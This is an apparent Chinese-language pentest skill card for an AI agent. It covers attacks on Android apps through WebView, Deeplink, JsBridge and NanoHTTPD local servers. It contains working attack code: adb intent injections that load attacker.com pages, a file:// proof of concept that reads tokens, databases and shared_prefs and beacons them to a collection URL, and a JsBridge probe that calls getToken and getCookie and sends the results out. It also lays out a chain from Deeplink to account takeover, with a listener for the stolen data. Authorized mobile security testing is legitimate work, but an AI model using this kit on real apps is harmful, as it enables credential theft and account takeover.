---
name: 内窗
category: mobile-pentest
priority: P1
score: 6
metadata:
  tags:
    - webview
    - deeplink
    - jsbridge
    - nanohttpd
    - android
    - intent
    - file-scheme
    - adb
    - javascript-interface
    - url-scheme
    - content-provider
    - exported-activity
  version: "2.0"
  updated: "2026-09-04"
  author: 大爱仙尊
description: >-
  Android WebView / Deeplink / JsBridge / NanoHTTPD 攻击面完整卡。
  静态桥面识别 + adb 命令 + intent 构造 + WebView file:// 访问 +
  JsBridge 方法枚举 + NanoHTTPD 本地服务探测 + 验证页 harness。
  触发：Deeplink/JsBridge/loadUrl extra/文件域/NanoHTTPD/addJavascriptInterface。
  先 apk-recon；L2 后必须 harness（验证页+adb）。--collect 回传实验室。
globs:
  - "*.apk"
  - "*.java"
  - "*.smali"
---

# webview-deeplink-bridge — WebView / Deeplink / JsBridge / NanoHTTPD 攻击面

授权包。先情报，再桥，再验证页。没有 `bridge_verify.html` 不算打完 L2。

---

## 关联 Skill & Playbook

| 方向 | 名称 | 说明 |
|------|------|------|
| 上游 | `apk-recon` | APK 情报提取（Activity/Provider/密钥初筛） |
| 上游 | `apk-reverse` | 完整反编译深入分析 |
| 平行 | `mobile-hardcoded-key-decrypt` | WebView 加载密钥解密 |
| 平行 | `apk-jni-sign-oss-sts` | JNI 签名 + OSS STS 链 |
| 平行 | `client-state-skip` | WebView 内 client-side 验证绕过 |
| 下游 | `xss-testing` | JsBridge XSS 到宿主 |
| 下游 | `file-upload-testing` | 利用 file:// 上传 |
| 下游 | `credential-harvest` | 通过 JsBridge 拿凭据 |
| 工具 | `炼蛊房/apk_recon.py` | APK 情报探针 |
| 工具 | `炼蛊房/webview_bridge_probe.py` | WebView 桥面扫描/验证页生成 |
| Playbook | `传承/内窗·深链.md` | 手法真源 |
| Playbook | `传承/安器·清单.md` | 客户端全面检查 |

---

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| **L1** | 发现导出 Activity 接收外部 URL/Deeplink 并在 WebView 中加载 | 只发现 Activity 存在但不加载 URL |
| **L1b** | JsBridge 方法枚举到 ≥3 个可调用接口 | 只有 `console.log` 等无害桥 |
| **L2** | 通过 Deeplink/JsBridge 读取到 file:// 本地文件（shared_prefs/DB/token）| file:// 被 WebSettings 禁止 |
| **L2b** | NanoHTTPD 本地服务未鉴权，可读取 APP 私有数据 | 只监听 loopback 且需 token |
| **L2c** | JsBridge 方法可执行敏感操作（getToken/getUserInfo/sendSMS） | 方法存在但返回空 |
| **L3** | 组合链：Deeplink → WebView加载攻击者页面 → JsBridge窃取 token → 接管账户 | 各环节独立无法串联 |

---

## 强制行为

1. **先跑 `apk_recon`**：提取 AndroidManifest 中导出组件、URL Scheme、权限
2. **静态分析必须做**：jadx 搜 `addJavascriptInterface` / `loadUrl` / `evaluateJavascript`
3. 发现 JsBridge 后必须枚举全部注入方法名
4. NanoHTTPD 必须检测本地端口监听
5. file:// 访问必须测试：`setAllowFileAccess` / `setAllowFileAccessFromFileURLs`
6. L2 达成后必须生成 `bridge_verify.html` 验证页

---

## Phase 0: APK 情报提取

### 命令 0-1: 本库探针快速扫描

```bash
# 使用本库探针
python3 炼蛊房/apk_recon.py extract --apk target.apk --case <案卷>
# 输出导出 Activity、URL Scheme、Provider、权限等

# 桥面专项扫描 + 验证页生成
python3 炼蛊房/webview_bridge_probe.py scan \
  --dir <jadx目录> --case <案卷> --pkg <包名>
```

### 命令 0-2: 手动提取 AndroidManifest 关键信息

```bash
# 解包并提取 Manifest
APK="target.apk"
apktool d "$APK" -o apktool_out -f

# 导出组件（接收外部 Intent 的 Activity）
echo "=== Exported Activities with Intent Filters ==="
python3 -c "
import xml.etree.ElementTree as ET
ns = {'a': 'http://schemas.android.com/apk/res/android'}
tree = ET.parse('apktool_out/AndroidManifest.xml')
for act in tree.findall('.//activity'):
    exported = act.get('{http://schemas.android.com/apk/res/android}exported', '')
    name = act.get('{http://schemas.android.com/apk/res/android}name', '')
    filters = act.findall('.//intent-filter')
    if exported == 'true' or filters:
        schemes = []
        hosts = []
        for f in filters:
            for d in f.findall('data'):
                s = d.get('{http://schemas.android.com/apk/res/android}scheme', '')
                h = d.get('{http://schemas.android.com/apk/res/android}host', '')
                if s: schemes.append(s)
                if h: hosts.append(h)
            for a in f.findall('action'):
                an = a.get('{http://schemas.android.com/apk/res/android}name', '')
        print(f'{name}')
        if schemes: print(f'  schemes: {schemes}')
        if hosts: print(f'  hosts: {hosts}')
        print(f'  exported: {exported}')
        print()
"

# URL Scheme 汇总
echo "=== All URL Schemes ==="
grep -oP 'android:scheme="\K[^"]+' apktool_out/AndroidManifest.xml | sort -u

# 导出 Content Provider
echo "=== Exported Providers ==="
grep -A5 'provider' apktool_out/AndroidManifest.xml | grep -E 'name=|exported=|authorities='
```

---

## Phase 1: 静态分析 — JsBridge / WebView 配置

### 命令 1-1: jadx 搜索 WebView 关键 API

```bash
# jadx 反编译
jadx -d jadx_out target.apk --show-bad-code

# 搜索 WebView 危险配置
echo "=== addJavascriptInterface（JsBridge 注入点）==="
grep -rn "addJavascriptInterface" jadx_out/ --include="*.java" | head -20

echo "=== loadUrl / evaluateJavascript（URL 加载）==="
grep -rn "loadUrl\|evaluateJavascript" jadx_out/ --include="*.java" \
  | grep -v "R.java\|BuildConfig" | head -30

echo "=== setAllowFileAccess（file:// 开关）==="
grep -rn "setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs" \
  jadx_out/ --include="*.java"

echo "=== WebViewClient.shouldOverrideUrlLoading（URL 拦截）==="
grep -rn "shouldOverrideUrlLoading\|shouldInterceptRequest" jadx_out/ --include="*.java" | head -20

echo "=== NanoHTTPD（本地 HTTP 服务）==="
grep -rn "NanoHTTPD\|nanohttpd\|newFixedLengthResponse" jadx_out/ --include="*.java" | head -20

echo "=== @JavascriptInterface 注解方法 ==="
grep -B2 -A5 "@JavascriptInterface" jadx_out/ -rn --include="*.java" | head -50
```

### 命令 1-2: JsBridge 方法全量枚举

```python
#!/usr/bin/env python3
"""从 jadx 输出中枚举所有 JsBridge 注入方法"""
import os, re, sys

jadx_dir = sys.argv[1] if len(sys.argv) > 1 else "jadx_out"

bridges = {}  # bridge_name -> [methods]
current_class = None

for root, dirs, files in os.walk(jadx_dir):
    for f in files:
        if not f.endswith('.java'):
            continue
        path = os.path.join(root, f)
        try:
            content = open(path, 'r', errors='replace').read()
        except:
            continue

        # 找 addJavascriptInterface 调用
        for m in re.finditer(r'addJavascriptInterface\s*\(\s*(\w+)\s*,\s*"(\w+)"', content):
            obj_name, bridge_name = m.group(1), m.group(2)
            bridges[bridge_name] = {"object": obj_name, "file": path, "methods": []}

        # 找 @JavascriptInterface 方法
        for m in re.finditer(r'@JavascriptInterface\s+public\s+\w+\s+(\w+)\s*\(([^)]*)\)', content):
            method_name = m.group(1)
            params = m.group(2).strip()
            class_match = re.search(r'class\s+(\w+)', content)
            cls_name = class_match.group(1) if class_match else f
            for bn in bridges:
                bridges[bn]["methods"].append({
                    "name": method_name,
                    "params": params,
                    "class": cls_name,
                })

print("=== JsBridge 枚举结果 ===")
for name, info in bridges.items():
    print(f"\nBridge: window.{name}")
    print(f"  Object: {info['object']}")
    print(f"  File: {info['file']}")
    for meth in info["methods"]:
        danger = "⚠️" if any(k in meth["name"].lower() for k in
            ["token","user","pass","cookie","file","exec","send","pay","secret","key"]) else "  "
        print(f"  {danger} {name}.{meth['name']}({meth['params']})")

# 直接搜全部 @JavascriptInterface
print("\n=== 所有 @JavascriptInterface 方法 ===")
for root, dirs, files in os.walk(jadx_dir):
    for f in files:
        if not f.endswith('.java'):
            continue
        path = os.path.join(root, f)
        try:
            content = open(path, 'r', errors='replace').read()
        except:
            continue
        for m in re.finditer(
            r'@JavascriptInterface\s+public\s+(\w+)\s+(\w+)\s*\(([^)]*)\)',
            content):
            ret_type, name, params = m.group(1), m.group(2), m.group(3)
            print(f"  {ret_type} {name}({params})  ← {os.path.basename(path)}")
```

---

## Phase 2: ADB 动态测试 — Deeplink / Intent 注入

### 命令 2-1: Deeplink 启动测试

```bash
# 基础 Deeplink 测试
PKG="com.example.app"
SCHEME="example"  # 从 Manifest 提取

# 测试各种 Deeplink URL
echo "=== Deeplink Launch Tests ==="

# 正常 Deeplink
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://main" "$PKG"

# 加载外部 URL
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=https://attacker.com/bridge_test.html" "$PKG"

# 加载 file:// URL
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=file:///data/data/${PKG}/shared_prefs/config.xml" "$PKG"

# 加载 javascript: URL
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=javascript:alert(document.cookie)" "$PKG"

# 用 http/https scheme 测试
adb shell am start -W -a android.intent.action.VIEW \
  -d "https://example.com/deeplink?redirect=https://attacker.com" "$PKG"
```

### 命令 2-2: 导出 Activity 直接 Intent 注入

```bash
PKG="com.example.app"

# 列出所有导出 Activity
adb shell dumpsys package "$PKG" | grep -A2 "Activity.*exported=true"

# 直接启动导出的 WebView Activity
# （替换为实际 Activity 名）
WEBVIEW_ACT="com.example.app.WebViewActivity"

# 通过 extra 传递 URL
adb shell am start -n "${PKG}/${WEBVIEW_ACT}" \
  --es "url" "https://attacker.com/bridge_test.html"

adb shell am start -n "${PKG}/${WEBVIEW_ACT}" \
  --es "webUrl" "https://attacker.com/bridge_test.html"

adb shell am start -n "${PKG}/${WEBVIEW_ACT}" \
  --es "loadUrl" "javascript:alert(document.cookie)"

# 常见 extra key 遍历
for KEY in url webUrl web_url link href page loadUrl redirect_url return_url uri target_url; do
  echo "--- Testing extra: $KEY ---"
  adb shell am start -n "${PKG}/${WEBVIEW_ACT}" \
    --es "$KEY" "https://attacker.com/probe?key=${KEY}" 2>&1
  sleep 1
done
```

### 命令 2-3: Content Provider 文件读取

```bash
PKG="com.example.app"

# 列出导出的 Provider
adb shell dumpsys package "$PKG" | grep -B1 -A5 "Provider.*exported=true"

# 尝试通过 Content URI 读取
AUTHORITY="com.example.app.fileprovider"
adb shell content read --uri "content://${AUTHORITY}/root/data/data/${PKG}/shared_prefs/"
adb shell content read --uri "content://${AUTHORITY}/external_files/"

# file_paths.xml 配置查看（从 apktool 解包）
cat apktool_out/res/xml/file_paths.xml 2>/dev/null || \
cat apktool_out/res/xml/provider_paths.xml 2>/dev/null
```

---

## Phase 3: WebView file:// 访问测试

### 命令 3-1: file:// 本地文件读取 PoC

```html
<!-- bridge_file_read.html — 部署到攻击者 Web 服务器 -->
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>WebView File Read PoC</title></head>
<body>
<h3>WebView File Access Test</h3>
<pre id="output">Testing...</pre>
<script>
const PKG = 'com.example.app';
const targets = [
  `file:///data/data/${PKG}/shared_prefs/${PKG}_preferences.xml`,
  `file:///data/data/${PKG}/shared_prefs/auth.xml`,
  `file:///data/data/${PKG}/shared_prefs/config.xml`,
  `file:///data/data/${PKG}/databases/app.db`,
  `file:///data/data/${PKG}/files/token.txt`,
  `file:///sdcard/Android/data/${PKG}/files/`,
  'file:///etc/hosts',
  'file:///proc/self/cmdline',
];

const out = document.getElementById('output');
let results = [];

async function testFileAccess(url) {
  return new Promise(resolve => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.onload = () => resolve({url, status: 'READ', data: xhr.responseText.substring(0, 500)});
    xhr.onerror = () => resolve({url, status: 'BLOCKED'});
    xhr.ontimeout = () => resolve({url, status: 'TIMEOUT'});
    xhr.timeout = 3000;
    try { xhr.send(); } catch(e) { resolve({url, status: 'ERROR: ' + e.message}); }
  });
}

(async () => {
  for (const url of targets) {
    const r = await testFileAccess(url);
    results.push(r);
    out.textContent += `\n${r.status}: ${r.url}`;
    if (r.data) out.textContent += `\n  → ${r.data.substring(0, 200)}`;
  }

  // 回传结果（如有 collect 服务器）
  const COLLECT = ''; // 填实验室 URL
  if (COLLECT) {
    navigator.sendBeacon(COLLECT, JSON.stringify(results));
  }
})();
</script>
</body>
</html>
```

### 命令 3-2: WebView 配置审计脚本

```python
#!/usr/bin/env python3
"""审计 jadx 输出中 WebView 安全配置"""
import os, re, sys

jadx_dir = sys.argv[1] if len(sys.argv) > 1 else "jadx_out"

DANGER_SETTINGS = {
    'setAllowFileAccess(true)': 'file:// 访问启用',
    'setAllowFileAccessFromFileURLs(true)': '同源 file:// XHR 启用（危险）',
    'setAllowUniversalAccessFromFileURLs(true)': '跨域 file:// 访问启用（极危险）',
    'setJavaScriptEnabled(true)': 'JavaScript 启用',
    'setAllowContentAccess(true)': 'content:// 访问启用',
    'setMixedContentMode(0)': '混合内容允许（HTTP in HTTPS）',
    'setSavePassword(true)': '密码保存启用',
    'setDomStorageEnabled(true)': 'DOM Storage 启用',
}

findings = []

for root, dirs, files in os.walk(jadx_dir):
    for f in files:
        if not f.endswith('.java'):
            continue
        path = os.path.join(root, f)
        try:
            content = open(path, 'r', errors='replace').read()
        except:
            continue
        for pattern, desc in DANGER_SETTINGS.items():
            escaped = re.escape(pattern.replace('(', r'\(').replace(')', r'\)'))
            simple_pat = pattern.replace('(', r'\(').replace(')', r'\)')
            if pattern.split('(')[0] in content:
                for i, line in enumerate(content.split('\n'), 1):
                    if pattern.split('(')[0] in line and 'true' in line.lower():
                        findings.append({
                            'file': os.path.relpath(path, jadx_dir),
                            'line': i,
                            'setting': pattern,
                            'desc': desc,
                        })

print("=== WebView 安全配置审计 ===")
for f in findings:
    risk = "🔴" if "Universal" in f['setting'] or "FileAccessFromFile" in f['setting'] else "🟡"
    print(f"{risk} {f['desc']}")
    print(f"   {f['file']}:{f['line']} → {f['setting']}")
    print()

if not findings:
    print("未发现危险 WebView 配置")
```

---

## Phase 4: JsBridge 运行时调用测试

### 命令 4-1: JsBridge 方法调用验证页

```html
<!-- bridge_verify.html — 通过 Deeplink 加载到目标 WebView 中 -->
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>JsBridge Verify</title></head>
<body>
<h3>JsBridge Method Probe</h3>
<pre id="log">Scanning bridges...</pre>
<script>
const log = document.getElementById('log');
function L(msg) { log.textContent += '\n' + msg; console.log(msg); }

// 常见 JsBridge 对象名
const BRIDGE_NAMES = [
  'Android', 'android', 'JSBridge', 'jsBridge', 'JsBridge',
  'NativeBridge', 'nativeBridge', 'WebViewBridge', 'AppBridge',
  'native', 'app', 'webkit', 'WKBridge', 'hybrid',
  '_dsbridge', 'dsBridge', 'callHandler',
];

// 探测存在的桥对象
const found = [];
for (const name of BRIDGE_NAMES) {
  if (window[name] && typeof window[name] === 'object') {
    found.push(name);
    L(`✅ Found bridge: window.${name}`);

    // 枚举方法
    const methods = [];
    for (const key of Object.getOwnPropertyNames(window[name])) {
      try {
        const type = typeof window[name][key];
        methods.push({name: key, type});
        const danger = ['token','user','pass','cookie','file','exec','send','pay','secret','key','sms']
          .some(k => key.toLowerCase().includes(k));
        L(`  ${danger ? '⚠️' : '  '} ${name}.${key} [${type}]`);
      } catch(e) {
        L(`  ❌ ${name}.${key}: ${e.message}`);
      }
    }
  }
}

if (found.length === 0) {
  L('No standard bridge objects found.');
  L('Trying prompt/console injection...');

  // DSBridge 风格（通过 prompt 通信）
  try {
    const r = prompt('_dsbridge={"method":"_hasNativeMethod","args":["getUserInfo"]}');
    if (r) L(`DSBridge response: ${r}`);
  } catch(e) {}
}

// 测试敏感方法调用
const SENSITIVE_CALLS = [
  () => { const r = window.Android?.getToken?.(); L(`getToken: ${r}`); },
  () => { const r = window.Android?.getUserInfo?.(); L(`getUserInfo: ${r}`); },
  () => { const r = window.Android?.getCookie?.(); L(`getCookie: ${r}`); },
  () => { const r = window.JSBridge?.call?.('getDeviceInfo'); L(`getDeviceInfo: ${r}`); },
  () => { const r = window.Android?.getSharedPreferences?.('auth'); L(`getSharedPrefs: ${r}`); },
];

for (const call of SENSITIVE_CALLS) {
  try { call(); } catch(e) {}
}

// 回传
const COLLECT = ''; // 实验室 URL
if (COLLECT && found.length > 0) {
  navigator.sendBeacon(COLLECT, JSON.stringify({bridges: found, url: location.href}));
}
</script>
</body>
</html>
```

### 命令 4-2: Frida Hook WebView.loadUrl 拦截

```javascript
/* frida -U -f <pkg> -l hook_webview.js --no-pause */
'use strict';

Java.perform(function () {
    const WebView = Java.use('android.webkit.WebView');

    // Hook loadUrl — 所有 URL 加载
    WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
        console.log(`[WebView.loadUrl] ${url}`);
        return this.loadUrl(url);
    };

    WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function (url, headers) {
        console.log(`[WebView.loadUrl+headers] ${url}`);
        const iter = headers.entrySet().iterator();
        while (iter.hasNext()) {
            const entry = iter.next();
            console.log(`  ${entry.getKey()}: ${entry.getValue()}`);
        }
        return this.loadUrl(url, headers);
    };

    // Hook evaluateJavascript — JS 注入
    WebView.evaluateJavascript.implementation = function (script, callback) {
        console.log(`[evaluateJavascript] ${script.substring(0, 200)}`);
        return this.evaluateJavascript(script, callback);
    };

    // Hook addJavascriptInterface — 桥注入
    WebView.addJavascriptInterface.implementation = function (obj, name) {
        console.log(`[addJavascriptInterface] name="${name}" class=${obj.getClass().getName()}`);
        const methods = obj.getClass().getMethods();
        for (let i = 0; i < methods.length; i++) {
            const m = methods[i];
            if (m.isAnnotationPresent(Java.use('android.webkit.JavascriptInterface').class)) {
                console.log(`  @JSInterface: ${m.getName()}(${m.getParameterTypes().map(t=>t.getName()).join(', ')})`);
            }
        }
        return this.addJavascriptInterface(obj, name);
    };

    // Hook WebSettings
    const WebSettings = Java.use('android.webkit.WebSettings');
    WebSettings.setAllowFileAccessFromFileURLs.implementation = function (allow) {
        console.log(`[WebSettings] setAllowFileAccessFromFileURLs(${allow})`);
        return this.setAllowFileAccessFromFileURLs(allow);
    };
    WebSettings.setAllowUniversalAccessFromFileURLs.implementation = function (allow) {
        console.log(`[WebSettings] setAllowUniversalAccessFromFileURLs(${allow})`);
        return this.setAllowUniversalAccessFromFileURLs(allow);
    };

    console.log('[*] WebView hooks installed');
});
```

---

## Phase 5: NanoHTTPD 本地服务探测

### 命令 5-1: 本地端口扫描

```bash
# 设备端本地端口扫描（发现 NanoHTTPD 等本地 HTTP 服务）
PKG="com.example.app"

# 启动目标 APP
adb shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1

sleep 3

# 检查目标 APP 监听的端口
PID=$(adb shell pidof "$PKG")
echo "APP PID: $PID"

echo "=== 目标 APP 监听端口 ==="
adb shell cat /proc/$PID/net/tcp 2>/dev/null | awk 'NR>1{
  split($2, a, ":");
  port = strtonum("0x" a[2]);
  if (port > 0) print "TCP " port " state=" $4
}'

adb shell cat /proc/$PID/net/tcp6 2>/dev/null | awk 'NR>1{
  split($2, a, ":");
  port = strtonum("0x" a[2]);
  if (port > 0) print "TCP6 " port " state=" $4
}'

# 快速端口探测（常见 NanoHTTPD 端口）
echo "=== 端口探测 ==="
for PORT in 8080 8081 8888 9090 12345 19000 19001 5000 3000 4567 18080; do
  RESP=$(adb shell "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:${PORT}/ 2>/dev/null")
  if [ "$RESP" != "000" ] && [ "$RESP" != "" ]; then
    echo "  Port $PORT: HTTP $RESP"
    # 获取响应头
    adb shell "curl -sI http://127.0.0.1:${PORT}/" 2>/dev/null | head -5
  fi
done
```

### 命令 5-2: NanoHTTPD 服务深入探测

```python
#!/usr/bin/env python3
"""NanoHTTPD 本地 HTTP 服务路由枚举（通过 adb forward）"""
import subprocess, requests, sys, json

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
LOCAL_PORT = PORT + 10000

# adb forward
subprocess.run(["adb", "forward", f"tcp:{LOCAL_PORT}", f"tcp:{PORT}"], check=True)
BASE = f"http://127.0.0.1:{LOCAL_PORT}"

# 常见 NanoHTTPD 路由
PATHS = [
    "/", "/index.html", "/api", "/api/v1",
    "/status", "/health", "/config", "/info",
    "/file", "/files", "/data", "/token",
    "/user", "/auth", "/login", "/session",
    "/shared_prefs", "/database", "/log",
    "/assets", "/resource", "/proxy",
    "/.env", "/manifest.json",
]

print(f"Probing NanoHTTPD on port {PORT}...")
for path in PATHS:
    try:
        r = requests.get(f"{BASE}{path}", timeout=3)
        if r.status_code != 404:
            ct = r.headers.get("Content-Type", "?")
            print(f"  {r.status_code} {len(r.content):>6}B {ct[:30]:30s} {path}")
            if r.status_code == 200 and len(r.content) > 0:
                preview = r.text[:200].replace('\n', ' ')
                print(f"       → {preview}")
    except Exception as e:
        pass

# 清理 forward
subprocess.run(["adb", "forward", "--remove", f"tcp:{LOCAL_PORT}"])
```

---

## Phase 6: 组合攻击链

### 命令 6-1: Deeplink → WebView → JsBridge 窃取 Token

```bash
# 完整攻击链（需先部署 bridge_verify.html 到攻击者服务器）
PKG="com.example.app"
SCHEME="example"
ATTACKER="https://attacker.com"  # 放置 bridge_verify.html

# Step 1: 通过 Deeplink 打开攻击者页面
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=${ATTACKER}/bridge_verify.html" "$PKG"

# Step 2: 如果有 file:// 访问权限，直接读本地文件
adb shell am start -W -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=file:///data/data/${PKG}/shared_prefs/auth.xml" "$PKG"

# Step 3: 通过导出 Activity + extra 传递
WEBVIEW_ACT="com.example.app.ui.WebViewActivity"
adb shell am start -n "${PKG}/${WEBVIEW_ACT}" \
  --es "url" "${ATTACKER}/bridge_verify.html"
```

### 命令 6-2: 实验室回收服务器

```bash
# 启动实验室收集服务器（收集 JsBridge 探测结果）
python3 炼蛊房/webview_bridge_probe.py listen \
  --case <案卷> --port 8765 --bind 0.0.0.0

# 生成带回传 + 全段端口的验证页
python3 炼蛊房/webview_bridge_probe.py harness \
  --dir <jadx目录> --case <案卷> --pkg <包名> \
  --collect http://<实验室IP>:8765/collect \
  --ports full
```

### 命令 6-3: 授权设备 Deeplink 批量测试脚本

```bash
#!/bin/bash
# deeplink_am.sh — 批量测试 Deeplink（放入 案卷/webview/）
PKG="${1:?Usage: $0 <package> <scheme>}"
SCHEME="${2:?Usage: $0 <package> <scheme>}"

PAYLOADS=(
  "${SCHEME}://main"
  "${SCHEME}://webview?url=https://attacker.com/probe"
  "${SCHEME}://webview?url=javascript:void(document.title='XSS')"
  "${SCHEME}://webview?url=file:///etc/hosts"
  "${SCHEME}://deep/link?redirect=https://attacker.com"
  "https://example.com/app?url=https://attacker.com"
  "intent://main#Intent;scheme=${SCHEME};package=${PKG};end"
)

for payload in "${PAYLOADS[@]}"; do
  echo "=== $payload ==="
  adb shell am start -W -a android.intent.action.VIEW -d "'${payload}'" "$PKG" 2>&1
  sleep 2
  # 截图记录
  adb shell screencap -p > "/tmp/deeplink_$(date +%s).png" 2>/dev/null
done
```

---

## 已知局限

1. Android 7+ 默认 `setAllowFileAccessFromFileURLs(false)`，file:// XHR 通常被阻止
2. Chrome Custom Tab 不暴露 JsBridge（需区分 WebView vs CCT）
3. NanoHTTPD 可能仅监听 127.0.0.1，需 adb forward 才能从主机访问
4. `shouldOverrideUrlLoading` 可能白名单校验 host，需寻找绕过（如 `@` / `#` / 子域）
5. DSBridge 风格通过 `prompt()` 通信，标准桥枚举可能遗漏

---

## 产出与落盘

```
案卷/<案卷>/
├── STATUS.md
├── 案卷/
│   ├── apk_recon/               # apk_recon 输出
│   ├── manifest_export.txt      # 导出组件分析
│   ├── jsbridge_enum.json       # JsBridge 方法枚举
│   ├── webview_settings.txt     # WebView 配置审计
│   └── nanohttpd_scan.txt       # NanoHTTPD 扫描结果
├── 接管/
│   ├── bridge_verify.html       # 验证页
│   ├── deeplink_test.txt        # Deeplink 测试记录
│   ├── file_access_poc.html     # file:// PoC
│   └── frida_hook_log.txt       # Frida hook 输出
└── REPORT.md
```

---

## 真源

- 工具: `炼蛊房/apk_recon.py` / `炼蛊房/webview_bridge_probe.py`
- 手法: `传承/内窗·深链.md`
- 客户端: `传承/安器·清单.md`
- 分级: `传承/春秋蝉·分案.md`
